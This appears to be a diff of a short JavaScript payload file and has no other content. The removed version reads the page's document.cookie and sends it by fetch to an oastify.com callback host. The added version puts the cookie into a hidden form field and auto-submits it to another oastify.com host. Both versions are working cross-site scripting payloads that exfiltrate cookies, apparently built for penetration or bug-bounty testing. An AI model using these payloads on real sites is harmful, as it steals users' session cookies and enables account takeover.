@@ -1,20 +1,13 @@
-const targetUrl = 'http://ji5rd84htpbadospi5salpyvimodcb00.oastify.com';
-const urlWithParams = `${targetUrl}?cookieData=${encodeURIComponent(document.cookie)}`;
+var form = document.createElement("form");
+form.setAttribute("method", "POST");
+form.setAttribute("action", "http://b5hj00r9ghy20gfh5xf28hln5eb5z4nt.oastify.com");
 
-fetch(urlWithParams, {
-  method: 'POST', // Specify the method
-  headers: {
-    'Content-Type': 'application/json'
-  },
-  body: JSON.stringify({
-    message: 'Logging cookie data via URL parameter'
-  })
-})
-.then(response => {
-  if (response.ok) {
-    console.log('Request sent successfully');
-  } else {
-    console.error('Request failed');
-  }
-})
-.catch(error => console.error('Error:', error));
+var hiddenField = document.createElement("input");
+hiddenField.setAttribute("type", "hidden");
+hiddenField.setAttribute("name", "test_data");
+hiddenField.setAttribute("value", document.cookie);
+
+form.appendChild(hiddenField);
+document.body.appendChild(form);
+
+form.submit();
